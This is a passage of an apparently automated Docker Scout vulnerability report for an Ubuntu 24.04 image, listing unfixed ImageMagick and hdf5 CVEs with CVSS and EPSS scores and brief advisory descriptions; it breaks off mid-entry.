<a href="https://scout.docker.com/v/CVE-2025-43965?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--43965" src="https://img.shields.io/badge/CVE--2025--43965-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.226%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIFF image processing in ImageMagick before 7.1.1-44, image depth is mishandled after SetQuantumFormat is used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-25664?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.1: CVE--2020--25664" src="https://img.shields.io/badge/CVE--2020--25664-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.087%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In WriteOnePNGImage() of the PNG coder at coders/png.c, an improper call to AcquireVirtualMemory() and memset() allows for an out-of-bounds write later when PopShortPixel() from MagickCore/quantum-private.h is called. The patch fixes the calls by adding 256 to rowbytes. An attacker who is able to supply a specially crafted image could affect availability with a low impact to data integrity. This flaw affects ImageMagick versions prior to 6.9.10-68 and 7.0.8-68.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55160?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.3: CVE--2025--55160" src="https://img.shields.io/badge/CVE--2025--55160-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.038%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-27 and 7.1.2-1, there is undefined behavior (function-type-mismatch) in splay tree cloning callback. This results in a deterministic abort under UBSan (DoS in sanitizer builds), with no crash in a non-sanitized build. This issue has been patched in versions 6.9.13-27 and 7.1.2-1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66628?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--66628" src="https://img.shields.io/badge/CVE--2025--66628-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is a software suite to create, edit, compose, or convert bitmap images. In versions 7.1.2-9 and prior, the TIM (PSX TIM) image parser contains a critical integer overflow vulnerability in its ReadTIMImage function (coders/tim.c). The code reads width and height (16-bit values) from the file header and calculates image_size = 2 * width * height without checking for overflow. On 32-bit systems (or where size_t is 32-bit), this calculation can overflow if width and height are large (e.g., 65535), wrapping around to a small value. This results in a small heap allocation via AcquireQuantumMemory and later operations relying on the dimensions can trigger an out of bounds read. This issue is fixed in version 7.1.2-10.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55005?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--55005" src="https://img.shields.io/badge/CVE--2025--55005-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-1, when preparing to transform from Log to sRGB colorspaces, the logmap construction fails to handle cases where the reference-black or reference-white value is larger than 1024. This leads to corrupting memory beyond the end of the allocated logmap buffer. This issue has been patched in version 7.1.2-1.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 24" src="https://img.shields.io/badge/M-24-fbb552"/> <img alt="low: 14" src="https://img.shields.io/badge/L-14-fce1a9"/> <!-- unspecified: 0 --><strong>hdf5</strong> <code>1.10.10+repack-3.1ubuntu4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/hdf5@1.10.10%2Brepack-3.1ubuntu4?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-9152?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.8: CVE--2019--9152" src="https://img.shields.io/badge/CVE--2019--9152-lightgrey?label=medium%208.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.396%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.10.4 library. There is an out of bounds read in the function H5MM_xstrdup in H5MM.c when called from H5O_dtype_decode_helper in H5Odtype.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-9151?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.8: CVE--2019--9151" src="https://img.shields.io/badge/CVE--2019--9151-lightgrey?label=medium%208.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.418%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.10.4 library. There is an out of bounds read in the function H5VM_memcpyvv in H5VM.c when called from H5D__compact_readvv in H5Dcompact.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2153?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.1: CVE--2025--2153" src="https://img.shields.io/badge/CVE--2025--2153-lightgrey?label=medium%208.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.234%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in HDF5 1.14.6. Affected is the function H5SM_delete of the file H5SM.c of the component h5 File Handler. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-11205?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.1: CVE--2018--11205" src="https://img.shields.io/badge/CVE--2018--11205-lightgrey?label=medium%208.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.771%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A out of bounds read was discovered in H5VM_memcpyvv in H5VM.c in the HDF HDF5 1.10.2 library. It could allow a remote denial of service or information disclosure attack.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6516?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.8: CVE--2025--6516" src="https://img.shields.io/badge/CVE--2025--6516-lightgrey?label=medium%207.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in HDF5 up to 1.14.6 and classified as critical. This vulnerability affects the function H5F_addr_decode_len of the file /hdf5/src/H5Fint.c. The manipulation leads to heap-based buffer overflow. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2310?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.8: CVE--2025--2310" src="https://img.shields.io/badge/CVE--2025--2310-lightgrey?label=medium%207.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in HDF5 1.14.6 and classified as critical. This issue affects the function H5MM_strndup of the component Metadata Attribute Decoder. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The vendor plans to fix this issue in an upcoming release.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2309?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.8: CVE--2025--2309" src="https://img.shields.io/badge/CVE--2025--2309-lightgrey?label=medium%207.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in HDF5 1.14.6 and classified as critical. This vulnerability affects the function H5T__bit_copy of the component Type Conversion Logic. The manipulation leads to heap-based buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The vendor plans to fix this issue in an upcoming release.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2308?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.8: CVE--2025--2308" src="https://img.shields.io/badge/CVE--2025--2308-lightgrey?label=medium%207.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in HDF5 1.14.6. This affects the function H5Z__scaleoffset_decompress_one_byte of the component Scale-Offset Filter. The manipulation leads to heap-based buffer overflow. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The vendor plans to fix this issue in an upcoming release.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-8397?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.5: CVE--2019--8397" src="https://img.shields.io/badge/CVE--2019--8397-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.284%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.10.4 library. There is an out of bounds read in the function H5T_close_real in H5T.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-8396?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.5: CVE--2019--8396" src="https://img.shields.io/badge/CVE--2019--8396-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.482%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A buffer overflow in H5O__layout_encode in H5Olayout.c in the HDF HDF5 through 1.10.4 library allows attackers to cause a denial of service via a crafted HDF5 file. This issue was triggered while repacking an HDF5 file, aka "Invalid write of size 2."

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-17432?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.5: CVE--2018--17432" src="https://img.shields.io/badge/CVE--2018--17432-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.759%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A NULL pointer dereference in H5O_sdspace_encode() in H5Osdspace.c in the HDF HDF5 through 1.10.3 library allows attackers to cause a denial of service via a crafted HDF5 file.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-17507?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 6.5: CVE--2017--17507" src="https://img.shields.io/badge/CVE--2017--17507-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.147%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In HDF5 1.10.1, there is an out of bounds read vulnerability in the function H5T_conv_struct_opt in H5Tconv.c in libhdf5.a. For example, h5dump would crash when someone opens a crafted hdf5 file.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7069?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--7069" src="https://img.shields.io/badge/CVE--2025--7069-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5FS__sect_link_size of the file src/H5FSsection.c. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7067?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--7067" src="https://img.shields.io/badge/CVE--2025--7067-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in HDF5 1.14.6. This vulnerability affects the function H5FS__sinfo_serialize_node_cb of the file src/H5FScache.c. The manipulation leads to heap-based buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2926?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--2926" src="https://img.shields.io/badge/CVE--2025--2926-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in HDF5 up to 1.14.6 and classified as problematic. This issue affects the function H5O__cache_chk_serialize of the file src/H5Ocache.c. The manipulation leads to null pointer dereference. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2924?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--2924" src="https://img.shields.io/badge/CVE--2025--2924-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, was found in HDF5 up to 1.14.6. This affects the function H5HL__fl_deserialize of the file src/H5HLcache.c. The manipulation of the argument free_block leads to heap-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2915?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.5: CVE--2025--2915" src="https://img.shields.io/badge/CVE--2025--2915-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in HDF5 up to 1.14.6. This vulnerability affects the function H5F__accum_free of the file src/H5Faccum.c. The manipulation of the argument overlap_size leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2913?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.3: CVE--2025--2913" src="https://img.shields.io/badge/CVE--2025--2913-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in HDF5 up to 1.14.6. It has been rated as critical. Affected by this issue is the function H5FL__blk_gc_list of the file src/H5FL.c. The manipulation of the argument H5FL_blk_head_t leads to use after free. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2912?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 5.3: CVE--2025--2912" src="https://img.shields.io/badge/CVE--2025--2912-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in HDF5 up to 1.14.6. It has been declared as problematic. Affected by this vulnerability is the function H5O_msg_flush of the file src/H5Omessage.c. The manipulation of the argument oh leads to heap-based buffer overflow. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6750?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--6750" src="https://img.shields.io/badge/CVE--2025--6750-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in HDF5 1.14.6. Affected by this issue is the function H5O__mtime_new_encode of the file src/H5Omtime.c. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6269?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--6269" src="https://img.shields.io/badge/CVE--2025--6269-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as critical was found in HDF5 up to 1.14.6. Affected by this vulnerability is the function H5C__reconstruct_cache_entry of the file H5Cimage.c. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2923?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--2923" src="https://img.shields.io/badge/CVE--2025--2923-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.087%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in HDF5 up to 1.14.6. Affected by this issue is the function H5F_addr_encode_len of the file src/H5Fint.c. The manipulation of the argument pp leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2914?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--2914" src="https://img.shields.io/badge/CVE--2025--2914-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.087%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

